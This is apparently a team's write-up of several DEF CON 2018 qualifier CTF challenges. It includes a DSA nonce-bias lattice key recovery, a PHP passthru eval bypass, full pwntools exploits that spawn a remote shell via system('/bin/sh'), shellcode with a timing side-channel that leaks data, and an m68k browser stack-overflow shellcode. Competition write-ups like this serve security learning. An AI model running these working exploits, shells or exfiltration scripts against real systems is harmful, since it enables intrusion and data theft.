The Second exploit was the first to be ready, but unfortunately we set the solver to use a `0xff` we found on the stack and it worked in every laptop in the lab but not in remote.....  
The First exploit was the second to be ready and succesfully led us to the flag.  
We finished the Third exploit just beacause we enjoyed the challenge and thought it was an elegant idea!

Oh, the flag was:  
`OOO{1f_U_Ar3_r34d1n6_7h15_y0u_4r3_7h3_m0z4rT_0f_1nf053c_Ch33rs2MP!}`


Official
--------
We are given a x86_64 ELF
- we can Sign a command (allowed ls..., stat..., du... , forbidden cat flag) and get a signature (r,s)
- we can Execute a command if we provide a signature (r,s)

By examining the binary we understand that it signs the command with DSA. The public parameters are hard coded in the binary as strings, while the private parameter is loaded from a file.

This is the signing process:
1. The DSA nonce is generated reading 0x14 bytes from /dev/urandom and stored in a global variable (k), the random bytes are later shuffled during the signing process
2. The input is then read, up to 256 bytes. There is a buffer overflow (at offset 0x1D26): with a 256 byte long input, the first byte of k is overwritten by a null byte
3. k is then shuffled, and the overwritten byte is moved from the first position (k[0]) to the last (k[19])
4. k is interpreted as an hex number

This means that we can reliably and consistently set the least significant byte of k to a fixed amount(0x00).

DSA is vulnerable to faults in the secrets, so even a few constant bits can compromise the private key.

By reading [this paper](https://hal.inria.fr/hal-00777804/document), we decided to implement a lattice attack on the alghorithm.

We estimated that we needed ~70 faulted signatures to be able to implement the attack (and to guarantee that the SVP solution contained the private key).

### Solver

We collected several signatures
```python
from Crypto.PublicKey import DSA

q = 739904609682520586736011252451716180456601329519
sign = [[47817980213997116983990891662989699152988893000, 550778919109238643794725030183918198033267410208, 115707849027963465953307322004337573514841630363], ...
```


We decided to implement a [modified version](https://crypto.stackexchange.com/questions/44644/how-does-the-biased-k-attack-on-ecdsa-work) of the algorithm in the paper which is (allegedly) faster.

The goal is to have `m.LLL(...)[0][-1] == 1`. It the condition is satisfied, we have found the privatekey.

```python
M = []
t = []
u = []

for i in range(len(sign)):
    t.append(
        (sign[i][1] * pow(sign[i][2] * 2^8, -1, q)) % q
    )
    u.append(
        (-sign[i][0] * pow(sign[i][2] * 2^8, -1, q)) % q
    )
M0 = []
for a in t:
    M0.append(int(a))
M1 = []
for b in u:
    M1.append(int(b))
for i in range(len(sign)):
    Mi = [0] * (len(sign) + 2)
    Mi[i] = q
    M.append(Mi)
M.append(M0 + [1, 0])
M.append(M1 + [0, 1])
from sage.modules.free_module_integer import IntegerLattice
m = IntegerLattice(M)
m.LLL(delta=0.999999999, eta=0.501)[0]
```

    Out[]: (...61262266441191146369913672082151254217822682617, 1)

### Final sanity check

If we got it correctly, the following condition should be true:
```python
mx = 61262266441191146369913672082151254217822682617
y = 12813568285675088759086...
g = 52865703933600072480340...
p = 14577437014070574361928...
pow(g, q - mx, p) == y
```

And it is! So we:

1. Set privkey locally to 678642343241329440366097580369564926238778646902 and sign "cat flag"
2. Get a valid signature
3. Execute cat flag on remote
4. ???
5. Profit



PHP Eval White-List
-------------------
For this challenge, we were given a [webpage](http://c67f8ffd.quals2018.oooverflow.io/) written in PHP, as well as its source code and the binary of a custom PHP extension (that supposedly implements the whitelist to be bypassed). The goal was to execute a binary, `flag`, and read its output.

The page contains a simple form that takes a PHP code snippet, and `eval()`s it. The challenge was far easier than expected: `passthru` was allowed (as well as `system`), and just putting in the form `passthru('../flag');` returned the flag :)

Flag: `OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}`



Ps-secure
---------

### Description
The program was about to generate the flag when something went wrong. We have a coredump of the process.

### Pwn tutorial
Process crashed on: `0x555555554e9a    inc    dword ptr [rax]` with `RAX  0x555555554e9a ◂— inc    dword ptr [rax]`, thus trying to write in a text segment caused segfault. We noticed that the original program had 4 args: `integer, integer, input file, output file`

#### By reversing program we understood that...
The first two integers, namely `num1` and `num2`, in `argv` are used to seed 2 independent LCG.
Unfortunately `argv` was partially overwritten with *xxxx* by the program, so the original LCG states are lost.

The first function `sub_B3B` opens the input file, generates a random offset (using state num1) and seeks at this offset.
Then 128 bytes are read and stored in a heap buffer at address `0x5555557588b0`.

The program then calls `sub_B0A` which gets 1 byte offset from rand 
to modify the caller stack frame by adding this offset to the stored RIP. As such a function that calls `sub_B0A` does not return where it was called, but somewhere after that point.

Since the program flow depends on the output of `rand` and the initial state is unknown, we can't recreate the correct execution flow.
So we tried to recover `num1` and `num2` from the stack when the process crashed, specifically at addresses `0x7fffffffec90` and `0x7fffffffec94`, respectively. We also noticed that the state `num2` is only used by `sub_B0A`, while `num1` is used for all the remaining rand calls (*i.e.*, seek offset, aligner, flag gen).

Knowing the last state of `num2` we calculated both the previous states and the corresponding rand output. In order to identify the inital `num2` state, we tried to identify which value would make sense for the first `sub_B0A` call. 

The function `noise_loader` (called from main `@0x1159`) has saved return address `0x115E`, so we assumed that the modified RIP would point to `0x0118D`. As a result the random offset must be `0x0118D - 0x115E = 47`. Now we have calculated the list of `num2` states starting from the last and back to the (found to be) initial one:
```
state_num2[0] -> 2031993358 

state_num2[-1] -> 1480659687 
rand() -> 29 # offset of third sub_B0A

state_num2[-2] -> 2318365684 
rand() -> 65 # offset of second sub_B0A

state_num2[-3]: 10821 # i.e. initial arvg[2]
rand() -> 47 # offset of first sub_B0A
```

#### At this stage we can reconstruct the real flow of the program:

```c
void main(int argc, char **argv)
{
    char *func_ptr;
    int i, j;
    char filename[32];
    int num1 = 0;
    int num2 = 0;

    printf("Thanks for choosing Ps Security\n");
    if ( argc <= 4 )
    {
        printf("Not enough parameters\n");
        exit(1);
    }
    if ( strlen(argv[4]) > 0x1F )
    {
        printf("Filename too long\n");
        exit(1);
    }
    num1 = atoi(argv[1]);
    num2 = atoi(argv[2]);
    for (i = 0; i < strlen(argv[1]); ++i)
        argv[1][i] = 'x';
    for (j = 0; j < strlen(argv[2]); ++j)
        argv[2][j] = 'x';
    sub_B3B(argv[3], &num1, &num2);
    sub_E51(&num1, (unsigned int *)&num2);
    strcpy(filename, argv[4]);
    strcat(filename, ".tXt");
    func_ptr = (char *)sub_E51 + (signed int)rand_((unsigned int *)&num1) % 65 + 0x1C;
    printf("Hold your breath..\n");
    
    ((void (__fastcall *)(char *, int *, int *))func_ptr)(filename, &num1, &num2);
    // which actually corresponds to sub_E9F(filename, &num1, &num2);
}

int64_t sub_E51(int *num1, unsigned int *num2)
{
    sub_B0A(num2);
    sub_BD2(num1, num2);
}
```

At end of main there is a function call that uses `sub_E51` as base address, adding a random offset computed from `rand(num1)`.
We noticed that `strcat(filename, ".tXt")` caused an overflow that overwrites the value of `num1` with `"tXt\x00"`: this makes the subsequent rand call to produce a bad offset which then made the program crash.

Here we started to make educated guesses on the offset that would produce the correct call: the allowed address range is `[0xE51+0x1C, 0xE51+0x1C+0x40]`. Probably the most correct address in this range is the beginning of `sub_E9F` that, guess what, computes and prints the flag! However, `sub_E9F` uses `rand(num1)` to compute the flag so we still needed to recover the correct `num1` state. We identified a set of constraints to calculate this value:

 * The first rand value is equal to the seek position (fseek value recovered from the FILE struct in the heap)
 * In function `sub_BD2` rand rand is repeatedly called until `rand(num1) == 0`.
    This function prints a dot every 50 iterations and `"\n   "` every 50 dots.
    We know that this functions gets called since, looking at the printf heap buffer `@0x555555757260`, we can tell that at least one full line of dots has been printed and the last line had 30 dots.
 * So the number of iterations of the while is `2500 + 2500*k + 1500 + [0,49]`
 * The last rand call is used to calculate `func_ptr` so `rand(num1) % 65 == 50`

Using these constraints we tested every possible num1 state value and we have identified about 30 candidates.
As a final step we implemented the code that generates the flag in C and... the first generated flag was correct /o\

#### Followed a proper Italian-style celebration!



Race Wars
---------

### Description: 

Jhonny: I gotta get you racing again so I can make some money off your ass.
Me: We'll see..

### First checks:

```bash
$ file ./racewars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
$ checksec --file ./racewars: 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### After some hours of reversing

We reversed all the basic interaction functions. Such as: choose_engine(), choose_chassis(), etc.. Most of them are just
fake and do not allow you to actually make a choice.

We understood that upgrade_transmission(transmission_struct * transmission) could have been the game winner. In fact it doas
not carefully checks for memory bounds when upgrading the Nth gear ratio. If transmission->gears_num is set to 0xffffffffffffffff 
then you can easily gain both arbitrary read and write (byte per byte).

```c
unsigned __int64 __fastcall upgrade_transmission(transmission_struct *transmission)
{
  __int64 inserted_value; // [rsp+10h] [rbp-20h]
  __int64 confirm; // [rsp+18h] [rbp-18h]
  __int64 selected_gear; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  inserted_value = -1LL;
  confirm = -1LL;
  selected_gear = -1LL;
  printf("ok, you have a transmission with %zu gears\n", transmission->gears_num);
  printf("which gear to modify? ");
  __isoc99_scanf("%zu", &inserted_value);
  if ( transmission->gears_num > (unsigned __int64)--inserted_value )
  {
    printf(
      "gear ratio for gear %zu is %zu, modify to what?: ",
      inserted_value + 1,
      (unsigned __int8)transmission->ratios[inserted_value + 1]);
    selected_gear = inserted_value;
    __isoc99_scanf("%zu", &inserted_value);
    printf("set gear to %d\n? (1 = yes, 0 = no)", inserted_value);
    __isoc99_scanf("%zu", &confirm);
    if ( confirm )
      transmission->ratios[selected_gear + 1] = inserted_value;
  }
  else
  {
    puts("ERROR: can't modify this gear.");
  }
  return __readfsqword(0x28u) ^ v5;
}
```
So we started searching for a bug that could give us the chance to overwrite that variable. 
We basically reversed all of the functions, including the ones handling the custom allocator used
by the program. It was intersting to notice that the custom heap management would not put any 
boundaries between its allocation. For instance a transmission_struct could have been right next
to a chassis one with no chunk headers or any byte separating them. 

### We finally found the bug

After hours spent reversing we realized the bug was instead under our eyes all the time.
The choose_tires() function (fragment below) is in fact asking for how many pairs of tires we want for our car.
For obvious reasons we must input a number grater or equal then 2. This input is then  multiplied for  32 
(the size of tire_struct) and passed to get_object_memory() function as its argument. 
We can just adjust the number of tires to pass the check but overflow the integer to trigger a get_object_memory(0).
This ends up returning a valid tire_struct() pointer but not updating the top_chunk addr in the custom
arena struct.

```c
  puts("how many pairs of tires do you need?");
  __isoc99_scanf("%d", &tires_pairs);
  if ( tires_pairs <= 1 )
  {
    puts("you need at least 4 tires to drive...");
    exit(1);
  }
  v5 = 32 * tires_pairs;
  v6 = (tyre_struct *)get_object_memory((custom_arena *)buffer, 32 * tires_pairs);
  if ( v6 )
    *tires_num = 2 * tires_pairs;
```

### Exploit strategy

Ok now if we go with something like:
```
choose_chassis()
choose_engine()
choose_tires() --> 2**27 pairs
choose_transmission()
```
We should end in a state in which tires_struct and transmission_struct are allocated in the same memory area.
Modifying the tires_struct with the upgrade_tires() function should end up in overwriting the transmission->gears_num
value. 
To achieve a call to system('/bin/sh\x00') we found convinient to overwrite custom function pointers implemented by the allocator,
which are used in the cleaning_up function (sub_4009F3()) showed below.

```c
void __fastcall cleaning_up(custom_arena *buffer)
{
  custom_arena *ptr; // ST10_8
  custom_arena *next_arena; // [rsp+18h] [rbp-18h]
  bin_struct *j; // [rsp+20h] [rbp-10h]
  function_struct *i; // [rsp+28h] [rbp-8h]

  for ( i = (function_struct *)buffer->functions_list; i; i = (function_struct *)i->next_func )
  {
    if ( i->function )
      ((void (__fastcall *)(_QWORD))i->function)(i->arg);
  }
```
We just need to place a pointer (using of course our arbitrary write) to a struct built as follows:
```
ptr_to_function
ptr_to_argument
0x00
```

Calculating offsets to system() and "/bin/sh" its easy since libc is provided with the challenge.

### Final exploit


```python
#!/usr/bin/env python2

from pwn import *

# context(log_level='debug')

libc = ELF('./libc-2.23.so')
#p = process(argv=('/home/andrea/ld-2.23.so', '--library-path', '.', './racewars'))
p = remote('2f76febe.quals2018.oooverflow.io', 31337)

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

p.recvuntil('Challenge: ')
challenge = p.recvuntil('\n')[:-1]
p.recvuntil('n: ')
n = int(p.recvuntil('\n')[:-1])

print('Solving challenge: "{}", n: {}'.format(challenge, n))

solution = solve_pow(challenge, n)
print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
p.sendline(str(solution))

def menu(n):
    p.recvuntil('CHOICE: ')
    p.sendline(str(n))

def pick_tires(pairs):
    menu(1)
    p.recvuntil('need?')
    p.sendline(str(pairs))

def pick_chassis():
    menu(2)
    p.recvuntil('eclipse\n')
    p.sendline('1')

def pick_engine():
    menu(3)

def pick_transmission(manual=True):
    menu(4)
    p.recvuntil('transmission?')
    p.sendline('1' if manual else '0')

def edit_tires(width, ratio, construction, diameter):
    menu(1)
    p.recvuntil('what?\n')
    p.sendline('1')
    p.recvuntil('width: ')
    p.sendline(str(width))
    menu(1)
    p.recvuntil('what?\n')
    p.sendline('2')
    p.recvuntil('ratio: ')
    p.sendline(str(ratio))
    menu(1)
    p.recvuntil('what?\n')
    p.sendline('3')
    p.recvuntil('construction (R for radial): ')
    p.sendline(str(construction))
    menu(1)
    p.recvuntil('what?\n')
    p.sendline('4')
    p.recvuntil('diameter: ')
    p.sendline(str(diameter))

def edit_transmission(gear, ratio, confirm=True):
    menu(4)
    p.recvuntil('modify? ')
    p.sendline(str(gear))
    p.recvuntil(' is ')
    old = int(p.recvuntil(',')[:-1])
    p.recvuntil('what?: ')
    p.sendline(str(ratio))
    p.recvuntil('0 = no)')
    p.sendline('1' if confirm else '0')
    return old

pick_chassis()
pick_engine()

pick_tires(2**27)

pick_transmission()

edit_tires(0xffff, 0xffff, 0xffff, 0xffff)

def write_byte(offset, value):
    edit_transmission(offset, ord(value))

def read_byte(offset):
    return chr(edit_transmission(offset, 0, False))

read_qword = lambda offset : u64(''.join(map(read_byte, range(offset, offset+8))))

heap_leak = read_qword(-48)
bin_offset = 0x400000 - heap_leak - 0x38

puts = read_qword(bin_offset + 0x203020)
libc_base = puts - libc.symbols['puts']

system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh\x00').next()

scratch = bin_offset + 0x203100  ## offset to 0x603100
print "scratch : " + hex(scratch)

def write_qword(offset, value):
    pk = p64(value)
    for i in range(8):
        write_byte(offset+i, pk[i])

write_qword(scratch, system)
write_qword(scratch+8, binsh)
write_qword(scratch+16, 0)

write_qword(-128, 0x603100)

menu(6)

p.interactive()

```

### Johnny thinks he's good, johnny just got pwned !

Flag: `OOO{4 c0upl3 0f n1554n 5r205 w0uld pull 4 pr3m1um 0n3 w33k b3f0r3 r4c3 w4rz}`


Sbva
----
> We offer extensive website protection that stops attackers even when the admin's credentials are leaked!
> Try our demo page http://0da57cd5.quals2018.oooverflow.io with username:password admin@oooverflow.io:admin to see for yourself.

On login we are redirected to `/wrongbrowser.php`, but some HTML is leaked anyway:
```html
HTTP/1.1 302 Found
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 14 May 2018 12:51:13 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: upgrade-insecure-requests
Location: wrongbrowser.php
Content-Length: 259


<html>
    <style scoped>
        h1 {color:red;}
        p {color:blue;}
    </style>
    <video id="v" autoplay> </video>
    <script>
        if (navigator.battery.charging) {
            console.log("Device is charging.")
        }
    </script>
</html>
```

Seems like the login page requires a specific User-Agent to confirm the login: should `navigator.battery.charging` JavaScript API be supported? [Mozilla Documentation](https://developer.mozilla.org/it/docs/Web/API/Navigator/battery) states that it is now obsolete and that support for the API has been removed in Firefox 50 in favor of `navigator.getBattery()`.

By bruteforcing the version component of the stock Firefox User-Agent header we can confirm that version 42 is the right one and the flag is printed:

Request
```html
POST /login.php HTTP/1.1
Host: 0da57cd5.quals2018.oooverflow.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://0da57cd5.quals2018.oooverflow.io/login.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Cookie: PHPSESSID=bqn0ut2np2gr7hplkuv4dph4o4
Connection: close
Upgrade-Insecure-Requests: 1

username=admin%40oooverflow.io&password=admin
```

Response
```html
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 14 May 2018 12:58:58 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: upgrade-insecure-requests
Content-Length: 291

OOO{0ld@dm1nbr0wser1sth30nlyw@y}
<html>
    <style scoped>
        h1 {color:red;}
        p {color:blue;}
    </style>
    <video id="v" autoplay> </video>
    <script>
        if (navigator.battery.charging) {
            console.log("Device is charging.")
        }
    </script>
</html>
```

Flag: `OOO{0ld@dm1nbr0wser1sth30nlyw@y}`


Shellql
-------
The challenge, reachable at http://b9d6d408.quals2018.oooverflow.io/,
provides a link and a `shellme.so` file.
The website accepts a shellcode as `POST` input and passes it to the `shellme` function
defined in the dynamic library.

### Problems
As soon as we tackled the challenge, we realized we were not able to make any request succeed, all
of them would return a 500 error.
To complicate things even further, the `prclt(22,1)` call in the library was setting seccomp in
strict mode before executing the shellcode, so we could only do
`read()`, `write()` and `exit()` calls.

We decided not to waste any time understanding the error and went for an infinite loop to
test whether our shellcode was executing correctly or not.

### Idea
Our only shot to get the flag was to interact with the mysql server, but we didn't want to
build any c++/php object.
Through reproducing the challenge in a local environment, under `strace`, we
noticed that a file descriptor (fd 4) was opened after the connection to the
database, so we could write raw mysql commands (using the mysql protocol) to this fd.

### Exploit
We decided to ask (`write()`) for `select * from flag` to the mysql fd, and then to
write (`read()`) the result of the query into the stack.

After that, we wanted to search for the `flag` word in memory (that would have been the name
of the table written in the response) and then for `OOO{` and `}` in order to be sure we
got the right fd.

To exfiltrate data from the stack we implemented a timing attack. Our initial goal was to
implement a binary search: we would hang the process in an infinite loop in case we `cmp`ared
the character in the stack with a smaller/equal char or we would let the process crash.

At the end we were just too lazy to do so: we knew we were missing 66 Bytes of flag
beetween `{` and `}` and we even knew the offset, so we wrote a script to brute'em all \0/.

Here's our script:
```python
from pwn import *
import requests
import time
import sys

URL = 'http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php'

def make_query():
    q = "\24\0\0\0\3select * from flag;"
    blocks = [q[i:i+8] for i in range(0, len(q), 8)]
    unp = []
    for b in blocks:
        unp.append(hex(u64(b)))
    return unp

shellcode ="""
mov rbp,rdi

xor rdi, rdi
add rdi, 0x4

mov rax, 0x3b67616c66206d6f
push rax

mov rax,0x7266202a20746365
push rax

mov rax, 0xdeadbeefcafebabe
mov rdx, 0xb2c8cdeccafebaaa
xor rax, rdx
push rax

mov rsi, rsp

xor rdx,rdx
add rdx, 24
xor rdi, rdi
add rdi, 0x4
xor rax, rax
inc rax
syscall

xor rax,rax
mov rsi, rsp
add rdx, 77777777

syscall
"""

def test_fn(index, char):
    payload = shellcode +     """
    xor rax,rax
    mov al, {}

    add rsp, rax
    movzx rax, byte ptr [rsp - 1]
    mov dl, {}

    cmp dl, al
    je LOOP
    jmp SEGV
    LOOP: jmp LOOP
    SEGV: pop rax
    """.format(index, char)
    payload = asm(payload, arch="x86_64")
    if any(ord(ch) == 0 for ch in payload): print "AIUTO"

    start_t = time.time()
    try:
        requests.post(URL, timeout=3, data={'shell': payload})
    except requests.exceptions.ReadTimeout :
        pass
    except requests.exceptions.ConnectionError :
        pass

    end_t = time.time()
    print >> sys.stderr, str(end_t - start_t)
    if end_t - start_t > 1.3:
        return True
    return False

def get_char(idx):
    for i in "O{abcdefghijklmnopqrstuvwxyz_, 0123456789!\'}":
        if test_fn(idx, ord(i)):
            print >> sys.stderr, i
            return i
    return "X"

def multiprocess_get_flag(beg, end, n_processes):
    from multiprocessing import Pool
    pool = Pool(processes=n_processes)
    return ''.join(pool.imap(get_char, range(beg, end)))

def get_flag(beg,end):
    flag = ""
    for j in range(beg, end):
        flag += get_char(j)
        print flag
    return flag

if __name__ == "__main__":
    #print get_flag(70, 140)
    print multiprocess_get_flag(69, 140, 4)
```

This method was not 100% reliable but running it a couple of times gave us the correct flag.

At the end the flag was:
`OOO{shellcode and webshell is old news, get with the times my friend!}`



TechSupport
-----------
When connecting to the remote server, we get something like:

```
Thank you for contacting Chemisoft technical support.
My name is Elen, how can I help you?
foo
Is your keyboard properly connected to the computer? yes
Did you experience similar problems with other software as well? no
Does the program persists when you are not looking at it? yes
I heard sometimes bugs are caused by the presence of floppy drives. Do you have one? no

Alright then - it looks like we ruled out the most common problems.
So, let me now look at the program for you.
I am going to use port 3456. Everything ready on your side? yes
```

Then we get an incoming GDB connection on 3456. We set up a GDB server that runs the provided `mcalc` binary (a simple molecular weight calculator). It complains about the invalid license, and the challenge server performs integrity checks via GDB to protect from patching. Those can be bypassed either by writing a fake GDB server, or by patching the binary in a way that is not detected (most of the time):

```
004016fe  mov     dword [rbp-0x30 {var_38}], 0xabc8eef
00401705  mov     dword [rbp-0x2c {var_34}], 0xb096bff4
0040170c  mov     dword [rbp-0x28 {var_30}], 0xe0c54799
00401713  mov     dword [rbp-0x24 {var_2c}], 0x68cbc732
0040171a  nop
(...)
00401721  nop
```

Now the helpdesk says the program worked fine. We patch in a `int 3` at `0x401abb` to make it crash, it says it'll try to reproduce the bug. So we need to make the original binary crash through the input formula only.

It is possible to force a division by zero. `main` calculates the total weight as sum of every count by its atom's weight, and if greater than 1000 it calls the sub at `0x40190b` to print stats about the main element. In the sub, the total weight (re-calculated) is used as denominator. Because of how the element-count mapping array in `main` is populated, if the same element is repeated multiple times, `main` will sum all occurrences, while the sub's total will only use the rightmost occurrence. So if we find a chemical formula that overflows the 32-bit sum to zero, then prepend an atom (with weight > 1000) that is already in the formula, we get a weight greater than 1000 in `main` but equal to zero in the sub, causing a division by zero. Such a formula can be found as a solution to an LP problem (minimizing used atoms, as there is a length limit).

Once the remote reproduction crashes, too, the helpdesk prints out the differences between the two states (our crash and reproduced crash). If a register is a valid memory address, it shows a dereferenced qword. So plan is: control a remote register at the crash to dereference the valid license buffer (which is reasonably the flag).

Before calling the sub, `ecx` contains the total weight as calculated in `main`, and it is not touched by the sub before the division. We build a formula so that the right portion overflows to zero (to trigger the crash), and the left portion uses only atoms already present in the right portion and sums to the address we want to read (to set `ecx`). License is 16 bytes at `0x6033d0`, so two crafted formulas later, we have the flag.

Script to generate the formulas:

```python
#!/usr/bin/python3

import struct
import pulp

with open('mcalc', 'rb') as f:
    f.seek(0x30a0)
    raw_atoms = f.read(8 * 100)

atoms = []
for i in range(0, len(raw_atoms), 8):
    raw_atom = raw_atoms[i:i+8]
    atom = (raw_atom[:4].strip(b'\x00').decode('ascii'), struct.unpack('<I', raw_atom[4:])[0])
    atoms.append(atom)

def formula(goal):
    prob = pulp.LpProblem('Formula Left', pulp.LpMinimize)
    cnt = pulp.LpVariable.dicts('cnt', range(len(atoms)), lowBound=0, upBound=999, cat='Integer')
    used = pulp.LpVariable.dicts('used', range(len(atoms)), cat='Binary')
    prob += sum(used)
    prob += sum(atoms[i][1] * cnt[i] for i in range(len(atoms))) == GOAL
    prob += sum(cnt) > 0
    for i in range(len(atoms)):
        prob += used[i] <= cnt[i], 'C_{}_upper'.format(i)
        prob += cnt[i] <= 10000*used[i], 'C_{}_lower'.format(i)

    prob.solve()

    formula = ''
    first_part_atoms = []
    for i in range(len(atoms)):
        value = int(pulp.value(cnt[i]))
        if value > 0:
            formula += '{}{}'.format(atoms[i][0], value if value > 1 else '')
            first_part_atoms.append(i)

    prob = pulp.LpProblem('Formula Right', pulp.LpMinimize)
    cnt = pulp.LpVariable.dicts('cnt', range(len(atoms)), lowBound=0, upBound=999, cat='Integer')
    used = pulp.LpVariable.dicts('used', range(len(atoms)), cat='Binary')
    prob += sum(used)
    prob += sum(atoms[i][1] * cnt[i] for i in range(len(atoms))) == 2**32
    prob += sum(cnt) > 0
    for i in range(len(atoms)):
        prob += used[i] <= cnt[i], 'C_{}_upper'.format(i)
        prob += cnt[i] <= 10000*used[i], 'C_{}_lower'.format(i)
    for i in first_part_atoms:
        prob += used[i] == True

    prob.solve()

    for i in range(len(atoms)):
        value = int(pulp.value(cnt[i]))
        if value > 0:
            formula += '{}{}'.format(atoms[i][0], value if value > 1 else '')
    return formula

LICENSE_ADDR = 0x6033d0
LICENSE_QWORDS = 2

for i in range(LICENSE_QWORDS):
    goal = LICENSE_ADDR + 8*i
    print('0x{:x}: {}'.format(goal, formula(goal)))
```



WWW
---
www, aka pwning browsers from the 90s.

### Challenge Description

The challenge asks for a URL to be visited by the browser WorldWideWeb 0.15 
running on the NeXTSTEP OS (arch m68k).

Once submitted the URL, the challenges returns a set of screenshots captured
during the execution of the browser.

### Vulnerability

First, by submitting a test URL and inspecting the returned screenshots, we were
able to identify the OS version and the browser. Then, we found and configured a
NeXTSTEP m68k emulator: http://previous.alternative-system.com/, on which we
installed the WorldWideWeb browser and a version of gdb. We were also able to
download the browser sources, from which we identified a classic stack overflow.

In fact, the `HTTP_Get` function contains a 257 bytes buffer (`command`), used
to perform the HTTP GET request, and then copies the URL into it without
checking sizes:

```c
#ifdef __STDC__
int HTTP_Get(const char * arg)
#else
int HTTP_Get(arg)
    char * arg;
#endif
{
    int s;                  /* Socket number for returned data */
    char command[257];      /* The whole command */
    int status;             /* tcp return */

    ...

    strcpy(command, "GET ");
    {
        char * p1 = HTParse(arg, "", PARSE_PATH|PARSE_PUNCTUATION);
        strcat(command, p1);
        free(p1);
    }

```

### Exploit

We were very happy to realize that no security measure (NX, ASLR,..) was
implemented in the 90s. This means we could craft a shellcode, put it in the
stack (together with a nice NOP sled), jump to it, and execute it.

After several attempts to write a working shellcode for m68k we were
successfully able to execute commands. First, we tried by executing `system("open flag")`,
which runs a graphic text editor opening the flag file. However, on the remote
machine the editor appeared behind the browser window, hiding half of the flag.
Second, we executed `cat flag`, looking at the output in the already opened
console. Even in this case we failed, as last chars of the flag were still
behind the browser window. Finally, by executing `cat flag` five times in our
shellcode, we were able to see the entire flag.

Flag: `defconctf{Party_like_its_1992_for_the_next_Step}`

Exploit:

```python
from pwn import *
import base64
import sys
import time
import os
host = 'ddee3e1a.quals2018.oooverflow.io'
port =  31337


def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def connect():
    global conn
    conn.close()
    conn = remote(host,port)
    conn.recvuntil('Challenge: ')
    challenge = conn.recvuntil('\n')[:-1]
    conn.recvuntil('n: ')
    n = int(conn.recvuntil('\n')[:-1])

    solution = solve_pow(challenge, n)
    conn.sendline(str(solution))

conn = remote(host,port)
connect()

filename = int(time.time())
os.mkdir(str(filename))

DOUBLE_NOP = '\x4e\x71\x4e\x71'
shellcode = '\x2c\x4f\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x2c\xc2\x22\x0f\x59\x8f\x2e\x81\x2c\x4f\x45\xf9\x05\x03\x07\xf8\x4e\x92'

payload = 'http://'
payload += 'a' * (259 - len(payload))
payload += '\x03\xff\xf7\xf8' * 8
payload += DOUBLE_NOP * 100
payload += shellcode

while True:
    conn.recvuntil("Welcome to the pre-alpha web aka ")
    token = conn.recvuntil("\n")[:-1]
    log.info("Token : "+token)
    conn.recvuntil("What URL would you like this old dog to fetch?\n")
    print 'sending:'
    print payload
    print payload.encode('hex')
    conn.sendline(payload)
    i = 0
    while True:
        cose = conn.recvuntil("DEBUG ")[:-6]
        if(len(cose)>0):
            log.info(cose)
        b64 = base64.b64decode(conn.recvline())
        f = open('./'+str(filename) + "/image"+str(i).rjust(4,"0")+".png","w")
        f.write(b64)
        f.close()
        log.info("Saved image"+str(i)+".png")
        i += 1


```

### Shellcode 

```
\x2c\x4f                    ## moveal %sp,%fp                
\xb5\x82                    ## eorl %d2,%d2
\x06\x82\x63\x61\x74\x20    ## addil #1667331104,%d2 --> 'cat '
\x2c\xc2                    ## moveal %d2,%fp@+

\xb5\x82                    ## eorl %d2,%d2
